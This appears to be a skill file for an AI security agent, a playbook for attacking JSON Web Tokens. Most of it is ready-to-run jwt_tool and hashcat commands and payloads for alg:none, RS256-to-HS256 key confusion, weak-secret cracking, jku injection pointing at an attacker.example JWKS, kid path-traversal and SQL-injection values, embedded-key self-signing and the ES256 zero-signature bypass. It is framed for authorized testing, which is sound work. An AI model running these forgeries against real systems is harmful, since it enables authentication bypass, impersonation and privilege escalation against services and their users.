---
name: attacking-jwt
description: Attack JSON Web Tokens by breaking the server's signature-verification decision — alg:none and its case variants, RS256-to-HS256 key confusion using the public key as an HMAC secret, weak HMAC secret cracking, jku/x5u/kid/jwk header injection, embedded-key self-signing, claim tampering, and algorithm-confusion bugs like the ES256 psychic-signature CVE. Use when a request contains a token starting with eyJ, when an Authorization: Bearer header carries a JWT, or when a JWT sits in a cookie, localStorage, session storage, or query parameter.
---

# Attacking JWT

A JWT is not a credential you are meant to read — it is a signature-verification
decision the server makes on bytes you control. Every field, including the
`alg` header that tells the server *how* to check the signature, is
attacker-supplied. The classic failures all come from the server trusting the
token's own header to decide how to verify it, or from a secret weak enough to
recover offline.

Only against systems you are authorized to test.

## When to Use

- A request carries a token in three base64url parts joined by dots, typically
  starting with `eyJ` (the encoded `{"` of the header)
- An `Authorization: Bearer <token>` header is present
- A session, `access_token`, `id_token`, or `remember-me` value lives in a
  cookie, `localStorage`, `sessionStorage`, or a query parameter
- The application authenticates or authorizes based on a signed token rather
  than a server-side session
- You control any claim (`sub`, `role`, `admin`, `aud`, `iss`) and want to see
  whether the signature is actually enforced

## When NOT to Use

- **The wider web-application methodology** — use `testing-web-applications`
- **API authentication and authorization generally** — use `testing-apis`
- **The cryptographic primitives themselves (HMAC, RSA, ECDSA design)** — use
  `reviewing-cryptography`
- **The OAuth/OIDC flow that issues the token, redirect_uri and PKCE abuse** —
  use `attacking-oauth-oidc`
- **Cloud IAM tokens (AWS STS, GCP, Azure AD access tokens) as an access
  primitive** — use `exploiting-cloud-platforms`

## Decode and Inspect First

A JWT is `header.payload.signature`, each part base64url (no padding, `-` and
`_` instead of `+` and `/`). The first two parts are plaintext; only the
signature is protected.

```bash
# jwt_tool: the fastest way to read a token and see every claim
python3 jwt_tool.py <token>

# By hand, no tools, no network
echo '<header>'  | tr '_-' '/+' | base64 -d 2>/dev/null; echo
echo '<payload>' | tr '_-' '/+' | base64 -d 2>/dev/null; echo
```

Read the header offline. Use jwt.io only with a token you are willing to paste
into a third-party site — for real engagement tokens, decode locally instead.
Note the `alg`, the `kid`, and any `jku`/`x5u`/`jwk` header. Note whether
`exp`, `iat`, and `nbf` are present, and what `iss`/`aud` expect. Every one of
these is a lever below.

## alg:none

If the server honours `alg: none`, it accepts an unsigned token. Strip the
signature (keep the trailing dot) and tamper with the payload freely.

```bash
# jwt_tool: exploit alg:none in all case variants at once
python3 jwt_tool.py <token> -X a
```

Servers that blocklist the literal string `none` often miss case variants,
because a case-insensitive compare was never applied. Try each:

```
none   None   NONE   nOnE   nonE   NonE
```

The resulting token is `base64url(header).base64url(payload).` — header and
payload changed, signature empty. Set `role`/`admin`/`sub` to what you want.

## RS256 to HS256 Key Confusion

The highest-value JWT bug. The server verifies with a generic
`verify(token, key)` that picks the algorithm from the token's own header. It
was configured with an RSA **public** key for RS256. Switch the header to
`HS256` and the server calls HMAC-SHA256 with that same key as the shared
secret — and the RSA public key is not secret. Sign your forged token with it.

```bash
# jwt_tool automates the whole confusion once you have the public key (PEM)
python3 jwt_tool.py <token> -X k -pk public.pem
```

You need the public key in the exact PEM bytes the server holds. Get it from:

```bash
# 1. A published JWKS endpoint — convert the JWK to PEM
curl -s https://target/.well-known/jwks.json
curl -s https://target/jwks.json
# jwx (or jwt_tool's key tools) turns a JWK into PEM
jwx jwk format --output-format pem jwks.json

# 2. The TLS certificate, when the signing key reuses the web key pair
openssl s_client -connect target:443 </dev/null 2>/dev/null \
  | openssl x509 -pubkey -noout > public.pem

# 3. Recover it from two tokens by RSA math when no key is published
#    (rsa_sign2n derives n from two signatures and emits candidate PEMs)
python3 jwt_forgery.py <token1> <token2>     # CVE-2017-11424; feed a candidate PEM into -X k above
```

The PEM must match byte-for-byte, including the trailing newline — a mismatch
produces an invalid signature and a false negative. Try the key both with and
without the final newline.

## Weak HMAC Secret Cracking

For HS256/384/512 the signature is `HMAC(secret, header.payload)`. If the
secret is a guessable string, recover it offline and then sign anything.

```bash
# hashcat mode 16500 is JWT-native — feed the whole token
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 token.txt jwt.secrets.list -r rules/best64.rule

# jwt_tool dictionary attack
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
```

Try common and framework-default secrets first: `secret`, `secretkey`,
`your-256-bit-secret`, `changeme`, `password`, the app name, and the
`jwt.io` demo secret. Once cracked, forge with the recovered key:

```bash
python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p '<secret>'
```

A recovered signing secret is a full authentication bypass — report it as
critical, not as "weak configuration."

## jku and x5u Header Injection

`jku` (JWK Set URL) and `x5u` (X.509 URL) tell the verifier where to fetch the
key. If the server fetches the URL from the token without pinning the host, host
your own JWKS and point the header at it, then sign with your matching private
key.

```bash
# Generate a key pair and a JWKS to serve
jwx jwk generate --type RSA --keysize 2048 --output-format json > priv.json
# Publish the public half as /jwks.json on a host you control, then:
python3 jwt_tool.py <token> -X s -ju https://attacker.example/jwks.json
```

Also test bypasses when there is an allowlist on the `jku` host: the same URL
parser tricks as SSRF (`@`, `#`, subdomain confusion, open redirects on the
trusted host). SSRF-style host validation gaps apply directly — see
`exploiting-ssrf`.

## kid Header Injection

`kid` selects which key to use and is frequently used to build a file path or a
database lookup — both are injectable.

```bash
# Path traversal to a file with known contents, then sign with those bytes.
# /dev/null is empty, so the HMAC key is the empty string.
{"alg":"HS256","kid":"../../../../../../dev/null"}
# Sign with an empty secret:
python3 jwt_tool.py <token> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

# A predictable static file (e.g. a public CSS/JS asset) works the same way:
# fetch its bytes, use them as the HMAC secret.

# SQL injection in the kid lookup — return an attacker-chosen key
{"alg":"HS256","kid":"nonexistent' UNION SELECT 'attackerkey'-- -"}
# then sign with 'attackerkey'
```

`kid` also reaches command injection and LFI where the value is passed to a
shell or file read unsanitized.

## Embedded jwk Header

A token may carry its own public key in a `jwk` header. A verifier that trusts
that embedded key instead of its configured key will accept anything you
self-sign — you supply both the key and the signature.

```bash
# jwt_tool injects a self-generated jwk and signs with its private half
python3 jwt_tool.py <token> -X i
```

This is the "bring your own key" variant of the header-injection family: the
server should ignore token-supplied keys entirely.

## Claim Tampering

Once you can produce a signature the server accepts (via any bug above, or if
signatures are simply never checked), the claims are yours:

- `sub` / `user_id` — impersonate another principal, including internal IDs
- `role` / `roles` / `groups` / `scope` / `admin` / `isAdmin` — privilege
  escalation; try both boolean `true` and string `"true"`, and array vs scalar
- `exp` — extend a captured token's lifetime; remove it entirely if unenforced
- `aud` — reuse a token minted for one service against another
- `iss` — pair with `jku`/`kid` tricks to assert a trusted issuer
- `nbf` / `iat` — bypass not-before windows

Always test the null case first: does the server reject a token whose signature
you flipped a single byte in? If not, no forgery skill is required.

## Algorithm Confusion Beyond RS/HS

- **ES256 (ECDSA)** — the "psychic signature" bug, CVE-2022-21449, affects Java
  15–18: an ECDSA signature of `r=0, s=0` verifies against any key. A token with
  `alg: ES256` and a signature of two zero values passes on vulnerable JDKs with
  no key knowledge at all.

```bash
# jwt_tool includes a check for the psychic/zero-signature ECDSA bypass
python3 jwt_tool.py <token> -X p
```

- **EdDSA / ES384 / PS256** — the same RS/HS confusion class applies whenever
  one verify function serves asymmetric and symmetric algorithms; try swapping
  to any HMAC variant.
- **Algorithm downgrade** — a token minted with a strong alg accepted when
  re-presented with a weaker one the server still supports.

## Token Lifetime and Revocation

Signature aside, stateless JWTs have design weaknesses to probe:

- **No revocation** — a stolen or logged-out token stays valid until `exp`
  because there is no server-side session to kill. Test whether logout, password
  change, or role change actually invalidates an outstanding token.
- **Long or absent `exp`** — capture a token and replay it hours or days later.
- **`exp` not enforced** — strip or backdate `exp` and see if it is checked.
- **Missing `aud`/`iss` checks** — a token accepted across services or tenants.
- **Tokens in logs, referrers, URLs** — a JWT in a query string leaks into
  access logs, proxies, and `Referer` headers.

## Rationalizations to Reject

- *"The token is signed, so it can't be tampered with."* Signed by whom, and
  verified how? alg:none, key confusion, and header injection all defeat a
  "signed" token without knowing the real key.
- *"We use RS256, which is asymmetric and secure."* RS256 is the precondition
  for the HS256 confusion attack — the public key becomes the HMAC secret.
- *"The signing secret is strong enough."* Prove it: run hashcat -m 16500 and
  the common-secret list. "Strong enough" is an untested assumption until it
  survives a crack.
- *"We block alg:none."* Do you block `None`, `NONE`, and `nOnE`? Blocklists
  that are not case-insensitive miss the variants.
- *"kid is just an internal key identifier."* It is attacker-supplied input
  flowing into a file path or SQL query — traversal and injection apply.
- *"jku points to our own domain."* Validate that with URL-parser and
  open-redirect bypasses before believing it; the same tricks as SSRF work.
- *"It expires quickly, so replay isn't a concern."* Verify `exp` is actually
  enforced, and remember there is no revocation — a stolen token is valid for
  its whole lifetime regardless.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Credential Access** (TA0006)

- [T1606](https://attack.mitre.org/techniques/T1606/) Forge Web Credentials — see also `attacking-oauth-oidc`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `testing-web-applications` — the surrounding web methodology
- `testing-apis` — API authentication and authorization at large
- `attacking-oauth-oidc` — the OAuth/OIDC flow that issues the token
- `reviewing-cryptography` — the HMAC/RSA/ECDSA primitives themselves
- `reporting-security-findings` — severity when a forgery bypasses auth
- jwt_tool (ticarpi), hashcat (-m 16500), jwt.io (offline/paste-aware), jwx
